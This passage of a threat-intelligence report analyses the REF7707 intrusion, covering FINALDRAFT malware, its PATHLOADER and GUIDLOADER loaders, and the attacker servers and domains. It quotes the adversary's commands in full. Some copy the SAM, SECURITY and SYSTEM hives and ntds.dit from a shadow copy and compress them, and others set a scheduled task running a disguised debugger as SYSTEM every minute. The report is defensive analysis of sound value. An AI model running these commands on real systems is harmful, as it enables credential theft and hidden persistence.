<p>As described in the <a href="https://www.elastic.co/security-labs/finaldraft">analysis</a> of FINALDRAFT, the malware defaults to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mspaint.exe</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">conhost.exe</code> if no target parameter is provided for an injection-related command.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="connectivity-checks" class="absolute -top-32"></span>Connectivity checks</h3>
<p>The adversary performed several connectivity tests using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping.exe</code> command and via PowerShell.</p>
<p>Powershell’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Invoke-WebRequest</code> cmdlet is similar to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wget</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">curl,</code> which pulls down the contents of a web resource. This cmdlet may be used to download tooling from the command line, but that was not the case here. These requests in context with several <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping</code>s are more likely to be connectivity checks.</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">graph.microsoft[.]com</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">login.microsoftonline[.]com</code> are legitimately owned Microsoft sites that serve API and web GUI traffic for Microsoft’s Outlook cloud email service and other Office 365 products.</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping graph.microsoft[.]com</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping www.google[.]com</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Powershell Invoke-WebRequest -Uri \&quot;hxxps://google[.]com\</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Powershell Invoke-WebRequest -Uri \&quot;hxxps://graph.microsoft[.]com\&quot; -UseBasicParsing</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Powershell Invoke-WebRequest -Uri \&quot;hxxps://login.microsoftonline[.]com\&quot; -UseBasicParsing</code></li>
</ul>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">digert.ictnsc[.]com</code> and<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> support.vmphere[.]com</code> were adversary-owned infrastructure.</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping digert.ictnsc[.]com</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Powershell Invoke-WebRequest -Uri \&quot;hxxps://support.vmphere[.]com\&quot; -UseBasicParsing</code></li>
</ul>
<p>We cover more about these network domains in the infrastructure section below.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="reconnaissance--enumeration--credential-harvesting" class="absolute -top-32"></span>Reconnaissance / enumeration / credential harvesting</h3>
<p>The adversary executed an unknown script called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SoftwareDistribution.txt</code>  using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">diskshadow.exe</code> utility, extracted the SAM, SECURITY, and SYSTEM Registry hives, and copied the Active Directory database (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntds.dit</code>). These materials primarily contain credentials and credential metadata. The adversary used the 7zip utility to compress the results:</p>
<pre><code>diskshadow.exe /s C:\\ProgramData\\SoftwareDistribution.txt

cmd.exe /c copy z:\\Windows\\System32\\config\\SAM C:\\ProgramData\\[redacted].local\\SAM /y

cmd.exe /c copy z:\\Windows\\System32\\config\\SECURITY C:\\ProgramData\\[redacted].local\\SECURITY /y

cmd.exe /c copy z:\\Windows\\System32\\config\\SYSTEM C:\\ProgramData\\[redacted].local\\SYSTEM /y

cmd.exe /c copy z:\\windows\\ntds\\ntds.dit C:\\ProgramData\\[redacted].local\\ntds.dit /y

7za.exe a [redacted].local.7z \&quot;C:\\ProgramData\\[redacted].local\\\&quot;</code></pre>
<p>The adversary also enumerated information about the system and domain:</p>
<pre><code>systeminfo

dnscmd . /EnumZones

net group /domain

C:\\Windows\\system32\\net1 group /domain

quser

reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID

reg query \&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\&quot;

reg query \&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UUID\&quot;</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence" class="absolute -top-32"></span>Persistence</h3>
<p>Persistence was achieved using a <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create">Scheduled Task</a> that invoked the renamed <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CDB.exe</code> debugger and the weaponized INI file every minute as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SYSTEM</code>. This methodology ensured that FINALDRAFT resided in memory.</p>
<pre><code>schtasks /create /RL HIGHEST /F /tn \&quot;\\Microsoft\\Windows\\AppID\\EPolicyManager\&quot; 
/tr \&quot;C:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe\&quot; 
/sc MINUTE /mo 1 /RU SYSTEM</code></pre>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">schtasks</code> - the Scheduled Task program</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/create</code> - creates a new scheduled task</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/RL HIGHEST</code> - specifies the run level of the job, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HIGHEST</code> runs as the highest level of privileges</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/F</code> - suppress warnings</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tn \\Microsoft\\Windows\\AppID\\EPolicyManager\</code> - task name, attempting to mirror an authentic looking scheduled task</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tr \&quot;C:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe\&quot;</code> - task to run, in this case the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fontdrvhost.exe</code> commands we covered earlier</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sc MINUTE</code> - schedule type, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">MINUTE</code> specifies the to run on minute intervals</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/mo 1</code> - modifier, defines <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1</code> for the schedule interval</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/RU SYSTEM</code> - defines what account to run as; in this situation, the task will run as the SYSTEM user</li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="finaldraft-analysis" class="absolute -top-32"></span>FINALDRAFT Analysis</h3>
<p>A technical deep-dive describing the capabilities and architecture of the FINALDRAFT and PATHLOADER malware is available <a href="https://www.elastic.co/security-labs/finaldraft">here</a>. At a high level, FINALDRAFT is a well-engineered, full-featured remote administration tool with the ability to accept add-on modules that extend functionality and proxy network traffic internally by multiple means.</p>
<p>Although FINALDRAFT can establish command and control using various means, the most notable are the means we observed in our victim environment, <a href="https://www.elastic.co/security-labs/finaldraft#communication-protocol">abuse of Microsoft’s Graph API</a>. We first observed this type of third-party C2 in <a href="https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry">SIESTAGRAPH</a>, which we reported in December 2022.</p>
<p>This command and control type is challenging for defenders of organizations that heavily depend on network visibility to catch. Once the initial execution and check-in have been completed, all further communication proceeds through legitimate Microsoft infrastructure (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">graph.microsoft[.]com</code>) and blends in with the other organizational workstations. It also supports relay functionality that enables it to proxy traffic for other infected systems. It evades defenses reliant on network-based intrusion detection and threat-intelligence indicators.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="pathloader-and-guidloader" class="absolute -top-32"></span>PATHLOADER and GUIDLOADER</h4>
<p>Both PATHLOADER and GUIDLOADER are used to download and execute encrypted shellcodes in memory. They were discovered in VirusTotal while investigating the C2 infrastructure and strings identified within a FINALDRAFT memory capture. They have only been observed in association with FINALDRAFT payloads.</p>
<p>A May 2023 sample in VirusTotal is the earliest identified binary of the REF7707 intrusion set. This sample was first submitted by a web user from Thailand, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dwn.exe</code> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf</code>) is a PATHLOADER variant that loads an encrypted FINALDRAFT binary from<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> poster.checkponit[.]com</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code>.</p>
<p>Between June and August of 2023, a Hong Kong VirusTotal web user uploaded <a href="https://www.virustotal.com/gui/search/41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081%250Ad9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461%250Af29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2%250A17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0%250A20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92%250A33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75%250A41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9%250A49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1%250A5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249%250A7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0%250A842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d%250Af90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12?type=files">12 samples of GUIDLOADER</a>. These samples each had minor modifications to how the encrypted payload was downloaded and were configured to use FINALDRAFT domains:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code></li>
<li>Google Firebase (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">firebasestorage.googleapis[.]com</code>)</li>
<li>Pastebin (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pastebin[.]com</code>)</li>
<li>A Southeast Asian University public-facing web storage system</li>
</ul>
<p>Some samples of GUIDLOADER appear unfinished or broken, with non-functional decryption routines, while others contain debug strings embedded in the binary. These variations suggest that the samples were part of a development and testing process.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="finaldraft-bridging-os" class="absolute -top-32"></span>FINALDRAFT bridging OS’</h4>
<p>In late 2024, two Linux ELF FINALDRAFT variants were uploaded to VirusTotal, one from the United States and one from Brazil. These samples feature similar C2 versatility and a partial reimplementation of the commands available in the Windows version. URLs were pulled from these files for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.vmphere[.]com</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update.hobiter[.]com</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pastebin.com</code>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="infrastructure-analysis" class="absolute -top-32"></span>Infrastructure Analysis</h2>
<p>In the <a href="https://www.elastic.co/security-labs/finaldraft">FINALDRAFT malware analysis report</a>, several domains were identified in the samples collected in the REF7707 intrusion, and other samples were identified through code similarity.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="service-banner-hashes" class="absolute -top-32"></span>Service banner hashes</h3>
<p>A Censys search for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hobiter[.]com</code> (the domain observed in the ELF variant of FINALDRAFT, discussed in the previous section) returns an IP address of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47.83.8.198</code>. This server is Hong Kong-based and is serving ports <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>. The string “<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hobiter[.]com</code>” is associated with the TLS certificate on port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>. A Censys query pivot on the service banner hash of this port yields six additional servers that share that hash (seven total).</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>IP</th><th>TLS Cert names</th><th>Cert CN</th><th>ports</th><th>ASN</th><th>GEO</th></tr></thead><tbody><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47.83.8.198</code></td><td>*.hobiter[.]com</td><td>CloudFlare Origin Certificate</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45102</code></td><td>Hong Kong</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.218.153.45</code></td><td>*.autodiscovar[.]com</td><td>CloudFlare Origin Certificate</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">53</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">2365</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">3389</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45102</code></td><td>Hong Kong</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45.91.133.254</code></td><td>*.vm-clouds[.]net</td><td>CloudFlare Origin Certificate</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">3389</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">56309</code></td><td>Nonthaburi, Thailand</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.213.217.182</code></td><td>*.ictnsc[.]com</td><td>CloudFlare Origin Certificate</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">53</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">3389</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45102</code></td><td>Bangkok, Thailand</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47.239.0.216</code></td><td>*.d-links[.]net</td><td>CloudFlare Origin Certificate</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">45102</code></td><td>Hong Kong</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">203.232.112.186</code></td><td>[NONE]</td><td>[NONE]</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">5357</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">5432</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">5985</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8000</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8080</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">9090</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15701</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15702</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15703</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">33990</code> <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47001</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">4766</code></td><td>Daejeon, South Korea</td></tr><tr><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">13.125.236.162</code></td><td>[NONE]</td><td>[NONE]</td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">80</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">3389</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8000</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15111</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15709</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">19000</code></td><td><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">16509</code></td><td>Incheon, South Korea</td></tr></tbody></table></div>
<p>Two servers (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">203.232.112[.]186</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">13.125.236[.]162</code>) do not share the same profile as the other five. While the service banner hash still matches, it is not on port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>, but on ports <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15701</code>,<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> 15702</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15703</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">15709</code>. Further, the ports in question do not appear to support TLS communications. We have not attributed them to REF7707 with a high degree of confidence but are including them for completeness.</p>
<p>The other five servers, including the original “hobiter” server, share several similarities:</p>
<ul>
<li>Service banner hash match on port <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code></li>
<li>Southeast Asia geolocations</li>
<li>Windows OS</li>
<li>Cloudflare issued TLS certs</li>
<li>Most have the same ASN belonging to Alibaba</li>
</ul>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hobiter-and-vmphere" class="absolute -top-32"></span>Hobiter and VMphere</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update.hobiter[.]com</code> and<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> support.vmphere[.]com</code> were found in an ELF binary (<a href="https://www.virustotal.com/gui/file/f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9">biosets.rar</a>) from December 13, 2024. Both domains were registered over a year earlier, on September 12, 2023. This ELF binary features similar C2 versatility and a partial reimplementation of the commands available in the Windows version of FINALDRAFT.</p>
<p>A name server lookup of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hobiter[.]com</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vmphere[.]com</code> yields only a Cloudflare name server record for each and no A records. Searching for their known subdomains provides us with A records pointing to Cloudflare-owned IP addresses.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="ictnsc" class="absolute -top-32"></span>ICTNSC</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ictnsc[.]com</code> is directly associated with the REF7707 intrusion above from a connectivity check (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ping digert.ictnsc[.]com</code>) performed by the attackers. The server associated with this domain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.213.217[.]182</code>) was identified through the Censys service banner hash on the HTTPS service outlined above. Like the other identified infrastructure, the subdomain resolves to Cloudflare-owned IP addresses, and the parent domain only has a Cloudflare NS record. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ictnsc[.]com</code> was registered on February 8, 2023.</p>
<p>While we cannot confirm the association as malicious, it should be noted that the domain <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ict.nsc[.]ru</code> is the Federal Research Center for Information and Computational Technologies web property, often referred to as the FRC or the ICT. This Russian organization conducts research in various areas like computer modeling, software engineering, data processing, artificial intelligence, and high-performance computing.</p>
